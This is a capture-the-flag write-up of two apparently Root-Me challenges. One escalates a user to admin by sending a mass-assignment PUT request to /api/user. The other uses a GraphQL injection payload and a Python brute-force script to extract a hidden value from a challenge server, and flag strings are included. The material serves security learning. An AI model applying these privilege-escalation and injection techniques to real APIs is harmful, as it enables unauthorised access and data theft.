{4lw4yS_ch3ck_0pt10ns_m3th0d}-->API Mass


In this challenge we need to get admin role to access the content of /api/flag.

1. As the name the name of challenge "API - Mass Assignment" refers to a type of vulnerability. After reading about that from here. I got the idea what it is.

2. I checked the allowed http methods on each endpoint using BurpSuite:

OPTIONS /api/signup
OPTIONS /api/login
OPTIONS /api/user
OPTIONS /api/note
OPTIONS /api/flag

Found that /api/user has ’PUT’ method enabled.
Now, it’s time to have some fun......

3. Created a user with username = ’u5’ from /api/signup

4. Logged in with new created user and server response is looked like

{"note":"",
"status":"guest",
"userid":77,
"username":"u5"}
5. Here we can see that ’status’ is ’guest’, we have to change that to ’admin’.
6. Now , we had checked that this /api/user has ’PUT’ method allowed and PUT methods is used to update the web/server content.
7. I crafted the request as:
— > changed the GET method to PUT
— > added the header ’Content-Type: application/json’ #this header is used to make the server accept json content by letting it know that data sent is json
— > and in last added the body content in json format like:

{
"status":"admin"
}
8. Response from the server :
{"message":"User updated sucessfully."}

9. Now, make GET request to /api/flag with updated user cookie in request.

10. Flag is received, challenge solved.



{3esy_gr@phql_b@ck3nd_1nj3ct10n} --->Gql injection


1. You must know injection payload :

payload : China"){country} PAYLOAD}#}"
How the payload work is first we close whatever(country) using ") and print country then payload. #" is to comment all character after #

2. Get HackerInSpace value :
China"){country} HackerInSpace(hacker_id:13){hacker_value}}#}"

3. But in this case we must brute HackerInSpace id to get 1 by 1 character in hacker_value :

import requests as rq
import json

url = "http://challenge01.root-me.org:59078/rocketql"
for i in range(100):
       payload = 'China"){country} HackerInSpace(hacker_id:'+str(i)+'){hacker_value}}#}"'
       data = {"q":payload}
       res = rq.post(url,data=data)
       x = json.loads(res.text)
       try:
               print(x["data"]["HackerInSpace"][0]["hacker_value"],end="")
       except:pass
